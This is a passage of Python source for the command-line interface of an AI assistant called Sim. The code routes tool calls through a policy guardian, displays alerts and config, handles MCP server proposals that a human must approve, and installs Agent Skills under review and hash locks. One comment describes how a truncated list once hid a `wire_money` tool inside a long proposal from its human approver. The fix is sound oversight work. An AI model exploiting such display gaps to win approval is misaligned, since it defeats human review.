    already reads its own stream the same way.
    """
    try:
        events = await ledger.read(TOOLS_STREAM)
    except Exception:  # noqa: BLE001 -- a diagnostic must not raise
        return {}
    latest: dict[str, dict] = {}
    for event in events:
        payload = event.payload or {}
        if payload.get("name"):
            latest[str(payload["name"])] = payload
    return latest


def cli_tool_args(tool: str, raw: str) -> dict:
    """What a person typed, as tool arguments.

    The model writes a two-part marker across two lines. A person types
    one line, so a two-part tool splits on the first space instead --
    `tool remind 20m take the bins out` means what it looks like. JSON
    is accepted whole for anything with a fiddly shape.
    """
    raw = (raw or "").strip()
    if raw.startswith("{"):
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            return {"__error__": "that is not valid JSON"}
        if isinstance(parsed, dict):
            return parsed
    if "\n" not in raw and tool in MARKER_SPLIT_FIRST_LINE:
        head, _, tail = raw.partition(" ")
        raw = f"{head}\n{tail.strip()}"
    args = args_from_text(tool, raw)
    if args:
        return args
    if "=" in raw:
        out: dict = {}
        for token in _KEY_VALUE.finditer(raw):
            out[token.group(1)] = _coerce(token.group(2).strip().strip('"\''))
        if out:
            return out
    return {}


_KEY_VALUE = re.compile(r"""([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|\S+)""")
#: The quoted alternatives come FIRST. With `\S+` leading, it won
#: matched `"two` out of `note="two words"` and the rest of the
#: value was silently dropped.


def _coerce(value: str):
    lowered = value.lower()
    if lowered in ("true", "false"):
        return lowered == "true"
    try:
        return int(value)
    except ValueError:
        pass
    try:
        return float(value)
    except ValueError:
        return value


async def _run_tool(*, bus: BusClient, ledger: LedgerClient, tool: str, raw: str,
                    session_id: str, timeout: float, action_id: str | None = None) -> Outcome:
    import asyncio

    args = cli_tool_args(tool, raw)
    if "__error__" in args:
        return Outcome(f"error: {args['__error__']}")
    # No secret rides in a proposal: every proposal is ledgered. The
    # setup commands hand passwords over another way (contracts/settings.py).
    leaked = sorted(k for k in args if k.lower() in _SECRET_ARG_KEYS and args[k])
    if leaked:
        return Outcome(f"refused: {', '.join(leaked)} must not be passed as a tool argument -- it would be written to "
                       f"the ledger. `cameras setup` and `ring setup` ask for a password hidden instead.")

    action_id = action_id or uuid.uuid4().hex[:12]
    loop = asyncio.get_running_loop()
    done: asyncio.Future = loop.create_future()

    async def _on_result(message) -> None:
        if not done.done() and message.payload.get("action_id") == action_id:
            done.set_result(("result", message.payload))

    async def _on_denied(message) -> None:
        if not done.done() and message.payload.get("action_id") == action_id:
            done.set_result(("denied", message.payload))

    # Subscribed BEFORE the proposal: a fast tool can answer before a
    # subscription made afterwards exists, and the command would hang
    # for its whole timeout on a call that had already succeeded.
    subs = [await bus.subscribe(topics.ACTION_RESULT, _on_result),
            await bus.subscribe(topics.ACTION_DENIED, _on_denied)]
    try:
        await bus.publish(bus.new(topics.ACTION_PROPOSED, {
            "action_id": action_id, "tool": tool, "args": args,
            "scope": {"paths": [], "network": False},
            # The floor. Guardian recomputes the real class itself and
            # never trusts a proposer's label, so understating here
            # cannot widen anything.
            "reversibility": "reversible",
            "rationale": f"asked for at the terminal by cli:{session_id}",
            "proposed_by": f"interface:{session_id}",
        }))
        try:
            kind, payload = await asyncio.wait_for(done, timeout=timeout)
        except asyncio.TimeoutError:
            return Outcome(f"{tool} did not finish within {timeout:.0f}s "
                           f"(action {action_id}; it may still be running)")
    finally:
        for sub in subs:
            await sub.unsubscribe()

    if kind == "denied":
        reasons = ", ".join(payload.get("reasons") or ()) or "no reason given"
        return Outcome(f"Guardian denied {tool} ({payload.get('layer', 'policy')}): {reasons}")

    body = payload.get("stdout_preview") or ""
    ref = payload.get("output_ref") or ""
    if ref:
        try:
            body = (await ledger.get_blob(ref)).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001 -- the preview is still worth printing
            pass
    if not payload.get("ok"):
        error = payload.get("error") or "failed"
        return Outcome(f"{tool} failed: {error}" + (f"\n{body}" if body else ""))
    took = payload.get("duration_ms")
    suffix = f"  ({took} ms)" if isinstance(took, int) and took > 50 else ""
    return Outcome((body or f"{tool} finished with no output") + suffix)


#: Domain -> what it is for, in the words a person would use. The order
#: is the order they are printed in.
_DOMAIN_BLURB: tuple[tuple[str, str], ...] = (
    ("knowledge", "your own documents, searchable"),
    ("pim", "calendar, mail and reminders"),
    ("home", "the house, through Home Assistant"),
    ("energy", "what the house uses and what it costs"),
    ("media", "what is playing, and running it"),
    ("security", "this machine's own exposure"),
)


async def _domains_command(ledger: LedgerClient, args: str = "") -> Outcome:
    """Which domains are set up, which answer, and what to do next.

    Reads the same capability probes `capabilities` does, and hands the
    rows to `render.domains_panel` rather than formatting here -- so it
    wraps to the real terminal and so the layout is testable without a
    Ledger.

    Three states, not two. "Nothing set up yet" and "set up and not
    answering" are different facts, and a view that showed them the same
    way made a fresh install look like a system on fire.
    """
    try:
        events = await ledger.read(CAPABILITIES_STREAM)
    except Exception as exc:  # noqa: BLE001 -- a diagnostic must not raise
        return Outcome(f"could not read the capability probes: {exc!r}")
    latest: dict[str, dict] = {}
    for event in events:
        payload = event.payload or {}
        name = str(payload.get("name") or "")
        if name.startswith("connector:"):
            latest[name[len("connector:"):]] = payload
    if not latest:
        return Outcome("no domain probes recorded yet -- they run just after boot, so try "
                       "again in a moment.")

    # `domains knowledge` narrows to one. The command took no arguments
    # and silently ignored anything typed after it, which reads as a
    # command that does not work rather than one that does not filter.
    wanted = args.strip().lower()
    known = {name for name, _ in _DOMAIN_BLURB}
    if wanted and wanted not in known:
        near = difflib.get_close_matches(wanted, sorted(known), n=3, cutoff=0.4)
        hint = f" -- did you mean {', '.join(near)}?" if near else ""
        return Outcome(f"no domain called {wanted!r}{hint}. "
                       f"They are: {', '.join(sorted(known))}.")

    rows: list[dict] = []
    for domain, blurb in _DOMAIN_BLURB:
        if wanted and domain != wanted:
            continue
        if domain == "pim":
            accounts = {name: row for name, row in latest.items()
                        if name.startswith(("imap:", "caldav:"))}
            if not accounts:
                rows.append({"name": domain, "blurb": blurb, "state": "todo", "detail": "",
                             "fix": "add [[execution.pim_accounts]], then "
                                    "`simorgh vault add imap:<name>`"})
                continue
            for name, row in sorted(accounts.items()):
                rows.append({**_domain_row(row), "name": name, "blurb": blurb})
            continue
        row = latest.get(domain)
        if row is None:
            rows.append({"name": domain, "blurb": blurb, "state": "todo",
                         "detail": "", "fix": "not probed yet"})
            continue
        rows.append({**_domain_row(row), "name": domain, "blurb": blurb})

    # `color_enabled()` rather than a bare True: it honours NO_COLOR,
    # which is what a person piping this into a file or a log expects.
    return Outcome(render_mod.domains_panel(rows, enabled=render_mod.color_enabled()))


def _domain_row(payload: dict) -> dict:
    """A probe payload as a panel row.

    `missing` is what separates the two failures: non-empty means
    nothing has been set up, which is not a fault; empty on a failed
    probe means it IS set up and is not answering, which is.
    """
    if payload.get("ok"):
        state = "ready"
    elif payload.get("missing"):
        state = "todo"
    else:
        state = "broken"
    return {"state": state, "detail": str(payload.get("detail") or "").strip(),
            "fix": str(payload.get("fix") or "").strip()}


async def _alerts_command(ledger: LedgerClient, args: str = "") -> Outcome:
    """What the monitors have raised.

    The alert framework produces all of this and nothing displayed it,
    so a `warn` held back by the rate limit or by quiet hours was
    invisible until the digest went out -- and the digest is exactly
    where a person is least likely to be looking when something is
    wrong now.
    """
    try:
        events = await ledger.read(ALERTS_STREAM)
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"could not read the alerts: {exc!r}")
    if not events:
        return Outcome("nothing has been raised. Monitors run on idle ticks; with none "
                       "registered yet this stays empty, which is the honest answer rather "
                       "than a clean bill of health.")

    open_alerts: dict[tuple[str, str], dict] = {}
    cleared = 0
    for event in events:
        payload = event.payload or {}
        key = (str(payload.get("monitor") or ""), str(payload.get("key") or ""))
        if event.type == "cleared":
            open_alerts.pop(key, None)
            cleared += 1
        else:
            open_alerts[key] = {**payload, "at": event.ts}

    if args.strip().lower() in ("all", "history"):
        lines = [f"  {event.type:8} {(event.payload or {}).get('monitor', ''):14} "
                 f"{(event.payload or {}).get('message', '')}" for event in events[-40:]]
        return Outcome(f"{len(events)} alert event(s), most recent last:\n" + "\n".join(lines))

    if not open_alerts:
        return Outcome(f"nothing open. {cleared} alert(s) have been raised and resolved.")

    order = {"critical": 0, "warn": 1, "info": 2}
    rows = sorted(open_alerts.values(),
                  key=lambda row: (order.get(str(row.get("severity")), 3),
                                    str(row.get("monitor"))))
    lines = []
    for row in rows:
        severity = str(row.get("severity") or "info")
        again = " REGRESSED" if float(row.get("reopened") or 0) else ""
        lines.append(f"  [{severity}]{again} {row.get('monitor')}: {row.get('message')}")
        # Where it went, and why. "Why didn't I hear about this" has an
        # answer, and this is it.
        channel, reason = row.get("channel"), str(row.get("reason") or "")
        if channel and channel != "notify":
            lines.append(f"        held for the {channel}: {reason}")
    held = sum(1 for row in rows if row.get("channel") == "digest")
    header = f"{len(rows)} open alert(s)"
    if held:
        header += f", {held} waiting for the daily digest"
    return Outcome(header + ":\n" + "\n".join(lines) + "\n(`alerts all` for the full history)")


async def _config_command(ledger: LedgerClient, args: str = "") -> Outcome:
    """The settings actually in force, and any that nothing reads.

    Every subsystem's `from_mapping` silently ignores a key it does not
    recognise, so a typo in simorgh.toml is indistinguishable from a
    setting that works: the file changes, the system does not, and
    nothing says so. The Kernel warns about it once at boot, where it
    scrolls past; this makes it answerable afterwards.

    `source` matters as much as the value. "It is the default" and "you
    set it to the same thing as the default" look identical in the
    value alone, and only one of them means a config line is doing
    nothing.
    """
    try:
        events = await ledger.read(CONFIG_STREAM)
    except Exception as exc:  # noqa: BLE001 -- a diagnostic must not raise
        return Outcome(f"could not read the config record: {exc!r}")
    if not events:
        return Outcome("no config has been recorded yet -- the Kernel writes it at boot, so "
                       "this is empty until the next start.")
    payload = events[-1].payload or {}
    sections = payload.get("sections") or {}

    wanted = args.strip().lower()
    lines: list[str] = []
    where = payload.get("path") or "(no simorgh.toml found -- every value is a default)"
    lines.append(f"config from {where}")

    for name in sorted(sections):
        if wanted and not name.startswith(wanted):
            continue
        fields = sections[name] or {}
        if "error" in fields:
            lines.append(f"\n[{name}]  {fields['error']}")
            continue
        from_file = {k: v for k, v in fields.items() if v.get("source") == "file"}
        if wanted:
            lines.append(f"\n[{name}]  {len(fields)} setting(s), {len(from_file)} from the file")
            for key in sorted(fields):
                mark = "*" if fields[key].get("source") == "file" else " "
                lines.append(f"  {mark} {key:34} {_short(fields[key].get('value'))}")
        elif from_file:
            lines.append(f"\n[{name}]  {len(from_file)} of {len(fields)} setting(s) set in the file")
            for key in sorted(from_file):
                lines.append(f"  * {key:34} {_short(from_file[key].get('value'))}")
        else:
            lines.append(f"\n[{name}]  all {len(fields)} setting(s) at their defaults")

    dead_sections = payload.get("dead_sections") or []
    dead_fields = payload.get("dead_fields") or []
    if dead_sections:
        lines.append("\nsections nothing reads: " + ", ".join(dead_sections))
    if dead_fields:
        lines.append("settings nothing reads: " + ", ".join(dead_fields))
    if not wanted:
        lines.append("\n`config <section>` shows every setting in one section; "
                     "`*` marks the ones your file sets.")
    return Outcome("\n".join(lines))


def _short(value, width: int = 60) -> str:
    text = json.dumps(value) if not isinstance(value, str) else value
    return text if len(text) <= width else text[: width - 1] + "\u2026"


async def _capabilities_command(ledger: LedgerClient) -> Outcome:
    """What Sim can actually reach right now.

    Half the toolset stands on something outside this repository -- Node,
    a bundled Chromium, an optional pip package, a Docker daemon. Each is
    allowed to be absent and every tool refuses cleanly, but "absent" was
    only ever discoverable by asking Sim to do the thing and watching it
    fail. Execution has probed all of it since boot and written the
    answers to the ledger; nothing read them back.

    Latest result per probe, since the stream is append-only and
    re-probed after a package install.
    """
    try:
        events = await ledger.read(CAPABILITIES_STREAM)
    except Exception as exc:  # noqa: BLE001 -- a diagnostic must not raise
        return Outcome(f"could not read capability probes: {exc!r}", exit_repl=False)
    if not events:
        return Outcome(
            "no capability probes recorded yet -- they run just after boot, so try again in a moment.",
            exit_repl=False,
        )
    latest: dict[str, dict] = {}
    for event in events:
        payload = event.payload or {}
        name = str(payload.get("name") or "")
        if name:
            latest[name] = payload
    return Outcome(render_mod.capabilities_panel(latest, enabled=render_mod.color_enabled(),
                                                 unicode=render_mod.unicode_mode() != "off"), exit_repl=False)


async def _mcp_pending_proposals(ledger: LedgerClient) -> dict[str, dict]:
    """The latest event per `proposal_id`, filtered to still-`pending`
    (an `approved`/`rejected` event for the same id supersedes it) --
    `execution/tools.py::ProposeMcpServerTool`'s own docstring has the
    full design: this stream is the one durable record of what Sim has
    asked for and what a human has decided."""
    events = await ledger.read(MCP_PROPOSALS_STREAM)
    latest: dict[str, dict] = {}
    for event in events:
        proposal_id = event.payload.get("proposal_id")
        if proposal_id:
            latest[proposal_id] = event.payload
    return {pid: p for pid, p in latest.items() if p.get("status") == "pending"}


async def _mcp_active_tools_line(bus: BusClient) -> str:
    try:
        reply = await bus.request(bus.new(topics.WORLD_ENV_QUERY, {"what": "tools", "args": {}}), timeout=3.0)
    except TimeoutError:
        return "active MCP tools: unavailable (no response)"
    except Exception as exc:  # noqa: BLE001 -- a status line reporting its own failure, never a crash
        return f"active MCP tools: error ({exc!r})"
    names = sorted(t["name"] for t in reply.payload.get("tools", []) if t.get("provider") == "mcp")
    return "active MCP tools: " + (", ".join(names) if names else "none configured")


def _toml_string(value: str) -> str:
    escaped = value.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    return f'"{escaped}"'


def _toml_string_array(items: list[str]) -> str:
    return "[" + ", ".join(_toml_string(item) for item in items) + "]"


def _mcp_server_toml_block(proposal: dict) -> str:
    """A standalone `[[execution.mcp_servers]]` block, appended to the
    end of the file rather than parsing-and-rewriting the whole
    document -- TOML's array-of-tables syntax allows a new element
    anywhere, so this never touches (or risks corrupting/reformatting)
    anything already in `simorgh.toml`, comments included."""
    lines = ["", "[[execution.mcp_servers]]",
             f"name = {_toml_string(proposal['name'])}",
             f"command = {_toml_string(proposal['command'])}"]
    if proposal.get("args"):
        lines.append(f"args = {_toml_string_array(proposal['args'])}")
    if proposal.get("read_only_tools"):
        lines.append(f"read_only_tools = {_toml_string_array(proposal['read_only_tools'])}")
    if proposal.get("env_keys"):
        # Never a real value -- Sim only ever proposes the variable
        # *names* a server needs (`ProposeMcpServerTool`'s own
        # validation); the human adds an `env` table by hand if the
        # server actually needs one.
        lines.append(f"# env vars this server needs (add real values yourself): {', '.join(proposal['env_keys'])}")
    # A `#` comment ends at the first newline in TOML -- anything after
    # one becomes a bare line with no `key = value`, which
    # `tomllib.load` refuses outright ("Expected '=' after a key in a
    # key/value pair"). This was unreachable while `reason` was
    # truncated to its first line by the PROPOSE_MCP_SERVER marker bug;
    # fixing that bug today (cognition/parser.py) legitimately restored
    # multi-line reasons, and one committed to `simorgh.toml` by
    # `mcp approve` broke the file Sim reads at its next boot (observer,
    # 2026-09-08). Collapsed to one line here, same as `preview()`
    # elsewhere in this codebase collapses a narrated multi-line value.
    reason = " ".join(str(proposal.get("reason", "")).split())
    lines.append(f"# approved via `mcp approve` -- Sim's own reason: {reason}")
    return "\n".join(lines) + "\n"


#: How many names of a granted-tool or wanted-secret list to print.
_MCP_LIST_SHOWN = 12


def _named_list(names: list[str]) -> str:
    """The names, capped BY COUNT, saying how many are not shown.

    `one_safe_line(", ".join(names))` cut the joined string at 200
    characters and ended it with an ellipsis that says nothing. A
    proposal declaring 200 read-only tools with `wire_money` at position
    150 rendered as twelve `read_thing_NNN` and a `…`, so the field
    added to show what an approval grants hid it again -- silently, and
    at the proposer's choice of ordering (observer, 2026-09-10). A
    truncation the reader cannot see the size of is the same failure as
    no field at all.
    """
    shown = [render_mod.one_safe_line(name, limit=60) for name in names[:_MCP_LIST_SHOWN]]
    hidden = len(names) - len(shown)
    if hidden > 0:
        shown.append(f"...and {hidden} more NOT SHOWN -- approving grants all {len(names)}")
    return ", ".join(shown)


#: Where installed skills live, beside the ones bundled in the repo.
SKILLS_HOME = Path("~/.simorgh/skills")


def _skill_roots() -> list[tuple[str, Path]]:
    """Bundled first, then installed: the first root with a name wins."""
    roots = [("bundled", Path("skills"))]
    home = SKILLS_HOME.expanduser()
    if home.is_dir():
        roots += [(child.name, child) for child in sorted(home.iterdir()) if child.is_dir()]
    return roots


#: Where `apply_skill` writes the Python skills Sim builds for itself
#: (execution/config.py `skill_dir`). A different thing from an Agent
#: Skill, and until now invisible to `skills list`.
WRITTEN_SKILLS_DIR = "simorgh_skills"

#: Repositories worth searching. Only ones actually verified to exist and
#: to hold skills belong here -- a list of plausible-looking URLs that
#: 404 is worse than a short list.
SKILL_SOURCES: tuple[tuple[str, str], ...] = (
    ("anthropics/skills", "document handling, skill authoring, MCP server guidance"),
)


def _first_docline(path: Path) -> str:
    """A written skill's own description: its module docstring, or its
    `run()` docstring. Parsed, never imported -- listing what is on disk
    must not execute it."""
    try:
        tree = ast.parse(path.read_text(encoding="utf-8", errors="replace"))
    except (OSError, SyntaxError, ValueError):
        return ""
    doc = ast.get_docstring(tree) or ""
    if not doc:
        for node in tree.body:
            if isinstance(node, ast.FunctionDef) and node.name == "run":
                doc = ast.get_docstring(node) or ""
                break
    return " ".join(doc.split())


def _written_skills() -> list[tuple[str, str]]:
    """The skills Sim has written for itself, called as `skill:<name>`.

    The creator, live 2026-09-15: "why the sill doesn't show up in skills
    list". Because there are two unrelated things called a skill -- an
    Agent Skill (a SKILL.md folder) and a Python tool Sim wrote -- and
    this command only ever read the first. A skill Sim built on request
    was missing from exactly where a person looks for it.
    """
    directory = Path(WRITTEN_SKILLS_DIR)
    if not directory.is_dir():
        return []
    return [(path.stem, _first_docline(path))
            for path in sorted(directory.glob("*.py")) if not path.name.startswith("_")]


def _fetch_tree(org_repo: str, *, timeout: float = 15.0) -> list[str]:
    """Every path in a repository, from GitHub's tree API.

    One request per repository rather than a clone: `anthropics/skills`
    is 16 MB, and searching it should not cost that.
    """
    url = f"https://api.github.com/repos/{org_repo}/git/trees/HEAD?recursive=1"
    request = urllib.request.Request(url, headers={
        "User-Agent": "Simorgh", "Accept": "application/vnd.github+json"})
    with urllib.request.urlopen(request, timeout=timeout) as response:  # noqa: S310 -- github API over https
        body = json.loads(response.read().decode())
    return [str(entry.get("path") or "") for entry in (body.get("tree") or [])]


def _search_cache_path() -> Path:
    return SKILLS_HOME.expanduser() / "search-cache.json"


def _lock_path() -> Path:
    return SKILLS_HOME.expanduser() / "lock.json"


def _read_lock() -> dict:
    """What is installed, how to fetch it again, and what it hashed to."""
    try:
        return json.loads(_lock_path().read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}


def _write_lock(lock: dict) -> None:
    path = _lock_path()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(lock, indent=2, sort_keys=True), encoding="utf-8")


def _file_hashes(folder: Path) -> dict:
    """sha256 of every file in the skill, by relative path.

    `SkillCard.sha256` hashes SKILL.md alone, so a diff against it would
    miss a changed script entirely -- the one change section 3.6 says must
    stop for approval. The lock hashes everything.
    """
    import hashlib

    out = {}
    for path in sorted(p for p in folder.rglob("*") if p.is_file()):
        try:
            out[str(path.relative_to(folder))] = hashlib.sha256(path.read_bytes()).hexdigest()
        except OSError:
            continue
    return out


async def _clone_at(source, into: Path) -> tuple[Path, str, str]:
    """`(folder, commit, problem)` -- a shallow clone, pinned to a commit."""
    url = f"https://{source.host}/{source.org}/{source.repo}.git"
    clone = await run_shell(f"git clone --depth 1 --quiet {url} {into}", timeout=180.0)
    if not into.is_dir():
        return into, "", f"could not clone {url}: {' '.join(clone.split())[:200]}"
    if source.ref:
        await run_shell(f"git -C {into} fetch --depth 1 --quiet origin {source.ref}", timeout=180.0)
        checkout = await run_shell(f"git -C {into} checkout --quiet {source.ref}", timeout=60.0)
        if "error" in checkout.lower() or "fatal" in checkout.lower():
            return into, "", f"no such commit {source.ref!r}: {' '.join(checkout.split())[:160]}"
    commit = (await run_shell(f"git -C {into} rev-parse HEAD", timeout=30.0)).strip().split("\n")[-1]
    return (into / source.path if source.path else into), commit, ""


def _skills_inside(root: Path, *, max_depth: int = 3, limit: int = 200) -> list[tuple[str, object]]:
    """Every skill in a collection repository, as `(path inside it, card)`.

    Most published skills do not live at the root of their own repo:
    `anthropics/skills` is a folder per skill. Typing the repository is
    the obvious thing to do, and answering "name the skill's own folder
    with #path" sends someone off to read a file tree by hand (the
    creator, live 2026-09-15). So Sim looks inside and says what is
    there."""
    from simorgh.contracts.skills import SkillCard, parse_skill

    found: list[tuple[str, object]] = []
    for skill_md in sorted(root.rglob("SKILL.md")):
        try:
            parts = skill_md.parent.relative_to(root).parts
        except ValueError:  # pragma: no cover -- a symlink out of the tree
            continue
        if not parts or len(parts) > max_depth or any(part.startswith(".") for part in parts):
            continue
        card = parse_skill(skill_md, source="candidate")
        if isinstance(card, SkillCard):
            found.append(("/".join(parts), card))
        if len(found) >= limit:
            break
    return found


async def _skills_command(args: str, *, ledger: LedgerClient, clock, clone=_clone_at, fetch=_fetch_tree) -> Outcome:
    """Agent Skills: what is here, what a skill contains, and installing one.

    Trust belongs to the organisation that maintains a repository (the
    creator, 2026-09-15): a skill from one of `TRUSTED_ORGS` is enabled once
    the deterministic review is clean, anything else waits for `skills
    approve`. The review always runs, and nothing is ever executed by it."""
    from simorgh.contracts.skills import discover_skills, parse_source, review_skill, review_text

    parts = args.split(None, 1)
    sub = parts[0].lower() if parts else "list"
    rest = parts[1].strip() if len(parts) > 1 else ""

    if sub in ("", "list"):
        cards, invalid = discover_skills(_skill_roots())
        written = _written_skills()
        if not cards and not written and not invalid:
            return Outcome("no skills yet -- `skills search` to see what is installable, "
                           "`skills install <git-url>` to add one")
        return Outcome(render_mod.skills_panel(cards, written, invalid, written_dir=WRITTEN_SKILLS_DIR,
                                               enabled=render_mod.color_enabled(),
                                               unicode=render_mod.unicode_mode() != "off"))

    if sub == "show":
        if not rest:
            return Outcome("usage: skills show <name>")
        cards, _ = discover_skills(_skill_roots())
        card = next((c for c in cards if c.name == rest.lower()), None)
        if card is None:
            return Outcome(f"no skill called {rest!r} -- `skills` lists them")
        return Outcome(f"{card.name} ({card.source})\n{card.description}\nfiles: {card.path}\n"
                       f"sha256: {card.sha256[:16]}…" + (f"\nprofiles: {', '.join(card.allowed_profiles)}"
                                                         if card.allowed_profiles else ""))

    if sub == "review":
        if not rest:
            return Outcome("usage: skills review <folder>")
        folder = Path(rest).expanduser()
        if not (folder / "SKILL.md").is_file():
            return Outcome(f"no SKILL.md in {folder}")
        return Outcome(review_text(review_skill(folder)))

    if sub == "install":
        if not rest:
            return Outcome("usage: skills install <git-url>[#path][@commit]   (github.com/anthropics/skills#document-skills)")
        source = parse_source(rest.split()[0])
        if source is None:
            return Outcome(f"{rest.split()[0]!r} is not a git URL I can read")
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            folder, commit, problem = await clone(source, Path(tmp) / "repo")
            if problem:
                return Outcome(f"refused: {problem}")
            if not (folder / "SKILL.md").is_file():
                inside = _skills_inside(folder)
                if not inside:
                    return Outcome(f"no SKILL.md at {source.path or '/'} in {source.name} -- and no skill in any "
                                   "folder under it either")
                base = f"{source.host}/{source.org}/{source.repo}"
                if len(inside) > 1:
                    width = max(len(card.name) for _rel, card in inside)  # type: ignore[attr-defined]
                    lines = [f"{source.name} holds {len(inside)} skills -- install one by its folder:"]
                    for rel, card in inside[:20]:
                        where = "/".join(p for p in (source.path, rel) if p)
                        lines.append(f"  {card.name.ljust(width)}  {where}")  # type: ignore[attr-defined]
                    if len(inside) > 20:
                        lines.append(f"  … and {len(inside) - 20} more")
                    first = "/".join(p for p in (source.path, inside[0][0]) if p)
                    lines.append(f"e.g. skills install {base}#{first}")
                    return Outcome("\n".join(lines))
                # Exactly one, so there is nothing to choose between: the
                # repository IS the skill, one folder down.
                only_rel, _only_card = inside[0]
                folder = folder / only_rel
                source = dataclasses.replace(source, path="/".join(p for p in (source.path, only_rel) if p))
            review = review_skill(folder)
            home = SKILLS_HOME.expanduser() / (source.org.lower() if source.trusted else "review") / review.name
            home.parent.mkdir(parents=True, exist_ok=True)
            if home.exists():
                shutil.rmtree(home)
            shutil.copytree(folder, home)
            record = {"name": review.name, "source": source.name, "commit": commit, "licence": review.licence,
                      "open_licence": review.open_licence, "scripts": list(review.scripts),
                      "findings": [f"{f.label} {f.path}:{f.line}" for f in review.blocking],
                      "notes": [f"{f.label} {f.path}:{f.line}" for f in review.notes],
                      "trusted": source.trusted, "path": str(home),
                      "status": "enabled" if (source.trusted and review.clean) else "waiting"}
            # The lock is what makes `skills update` possible at all:
            # `Source.name` is only "org/repo", so without the host, the
            # #path and the pinned commit there is nothing to re-fetch.
            lock = _read_lock()
            lock[review.name] = {
                "host": source.host, "org": source.org, "repo": source.repo, "path": source.path,
                "commit": commit, "licence": review.licence, "trusted": source.trusted,
                "installed_at": clock.now(), "path_on_disk": str(home),
                "status": record["status"], "files": _file_hashes(home),
            }
            _write_lock(lock)
            await ledger.append(SKILLS_STREAM, Event(
                stream=SKILLS_STREAM, type="installed", ts=clock.now(), trace_id=review.name,
                causation_id=None, payload=record))
            head = f"{review.name} from {source.name} at {commit[:12]}"
            if record["status"] == "enabled":
                return Outcome(f"{head}: trusted org, review clean -- installed to {home}\n{review_text(review)}")
            why = "review flagged something" if not review.clean else "not a trusted org"
            return Outcome(f"{head}: {why}, so it is NOT enabled.\n{review_text(review)}\n"
                           f"`skills approve {review.name}` to enable it, `skills remove {review.name}` to drop it.")

    if sub == "search":
        # A typed command, so it costs nothing on a model call: the
        # catalog a task pays for holds only enabled skills. The creator,
        # 2026-09-15: "this effort should not come with penalty of token
        # additions".
        query = rest.strip().lower()
        cache_path = _search_cache_path()
        cache: dict = {}
        try:
            cache = json.loads(cache_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            cache = {}
        # A cache is fresh only if it actually holds something. Testing the
        # timestamp alone made an ABSENT cache look fresh whenever the clock
        # read less than a day in seconds -- 0.0 > now - 86400 is true for
        # any small clock -- so nothing was ever fetched and every search
        # answered "nothing found".
        cached_sources: dict = dict(cache.get("sources") or {})
        fresh_enough = bool(cached_sources) and float(cache.get("at") or 0.0) > clock.now() - 86_400.0
        found: dict[str, list[str]] = cached_sources if fresh_enough else {}
        problems: list[str] = []
        if not found:
            for org_repo, _blurb in SKILL_SOURCES:
                try:
                    paths = await asyncio.to_thread(fetch, org_repo)
                except Exception as exc:  # noqa: BLE001 -- offline is an answer, not a crash
                    problems.append(f"{org_repo}: {exc!r}"[:160])
                    continue
                found[org_repo] = sorted(
                    p[: -len("/SKILL.md")] for p in paths if p.endswith("/SKILL.md"))
            if found:
                try:
                    cache_path.parent.mkdir(parents=True, exist_ok=True)
                    cache_path.write_text(json.dumps({"at": clock.now(), "sources": found}), encoding="utf-8")
                except OSError:
                    pass
        lines: list[str] = []
        total = 0
        for org_repo, blurb in SKILL_SOURCES:
            folders = [f for f in found.get(org_repo, []) if not query or query in f.lower()]
            if not folders:
                continue
            total += len(folders)
            lines.append(f"{org_repo} -- {blurb}")
            for folder in folders[:30]:
                lines.append(f"  {folder.rsplit('/', 1)[-1]:24s} skills install github.com/{org_repo}#{folder}")
            if len(folders) > 30:
                lines.append(f"  ... and {len(folders) - 30} more")
        if not lines:
            said = f"nothing matching {query!r}" if query else "nothing found"
            return Outcome(f"{said}" + ("\n" + "\n".join(problems) if problems else ""))
        head = f"{total} skill(s) available" + (f" matching {query!r}" if query else "") + \
               (" (cached)" if fresh_enough else "")
        tail = ("\n" + "\n".join(problems)) if problems else ""
        return Outcome(head + "\n" + "\n".join(lines) + tail)

    if sub == "update":
        if not rest:
            return Outcome("usage: skills update <name>")
        name = rest.lower()
        lock = _read_lock()
        entry = lock.get(name)
        if entry is None:
            return Outcome(f"nothing installed called {name!r} with a lock to update from "
                           "-- `skills` lists what is here; reinstall it to make it updatable")
        from simorgh.contracts.skills import Source

        source = Source(host=entry["host"], org=entry["org"], repo=entry["repo"], path=entry.get("path", ""))
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            folder, commit, problem = await clone(source, Path(tmp) / "repo")
            if problem:
                return Outcome(f"refused: {problem}")
            if not (folder / "SKILL.md").is_file():
                return Outcome(f"no SKILL.md at {source.path or '/'} any more in {source.name}")
            if commit == entry.get("commit"):
                return Outcome(f"{name}: already at {commit[:12]} -- nothing upstream has changed")
            fresh = _file_hashes(folder)
            was = entry.get("files") or {}
            changed = sorted(p for p in set(fresh) | set(was) if fresh.get(p) != was.get(p))
            # A changed script, or changed instructions, is a new thing to
            # trust -- not the thing that was approved.
            decisive = [p for p in changed
                        if p == "SKILL.md" or Path(p).suffix.lower() in (".py", ".sh", ".js", ".rb", ".pl", ".ps1", ".bat")]
            review = review_skill(folder)
            head = f"{name}: {entry.get('commit', '')[:12]} -> {commit[:12]}, {len(changed)} file(s) changed"
            if not decisive and source.trusted and review.clean:
                home = Path(entry["path_on_disk"])
                if home.exists():
                    shutil.rmtree(home)
                home.parent.mkdir(parents=True, exist_ok=True)
                shutil.copytree(folder, home)
                lock[name] = {**entry, "commit": commit, "files": fresh, "licence": review.licence,
                              "installed_at": clock.now()}
                _write_lock(lock)
                await ledger.append(SKILLS_STREAM, Event(
                    stream=SKILLS_STREAM, type="updated", ts=clock.now(), trace_id=name, causation_id=None,
                    payload={"name": name, "commit": commit, "changed": changed, "status": "enabled"}))
                return Outcome(f"{head}; documentation only, review clean -- updated in place\n{review_text(review)}")
            waiting = SKILLS_HOME.expanduser() / "review" / name
            waiting.parent.mkdir(parents=True, exist_ok=True)
            if waiting.exists():
                shutil.rmtree(waiting)
            shutil.copytree(folder, waiting)
            lock[name] = {**entry, "commit": commit, "files": fresh, "status": "waiting",
                          "path_on_disk": str(waiting), "installed_at": clock.now()}
            _write_lock(lock)
